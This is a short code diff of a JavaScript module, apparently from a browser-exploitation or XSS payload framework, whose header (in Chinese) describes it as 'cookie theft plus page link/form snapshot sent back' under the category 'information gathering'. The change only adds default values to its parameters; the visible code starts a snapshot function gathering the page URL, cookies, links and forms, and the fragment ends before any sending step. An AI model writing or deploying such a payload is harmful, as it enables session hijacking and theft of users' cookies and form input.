@@ -1,4 +1,4 @@
-// MODULE = {"desc": "Cookie 窃取 + 页面链接/表单快照回传", "category": "信息收集", "params": [["urls", "收集页面链接 1/0,默认 1"], ["forms", "收集表单输入 1/0,默认 0"]]}
+// MODULE = {"desc": "Cookie 窃取 + 页面链接/表单快照回传", "category": "信息收集", "params": [["urls", "收集页面链接 1/0,默认 1", "1"], ["forms", "收集表单输入 1/0,默认 0", "0"]]}
 (function () {
   function snapshot() {
     var d = { type: "cookie", url: location.href, cookie: "", links: [], forms: [] };
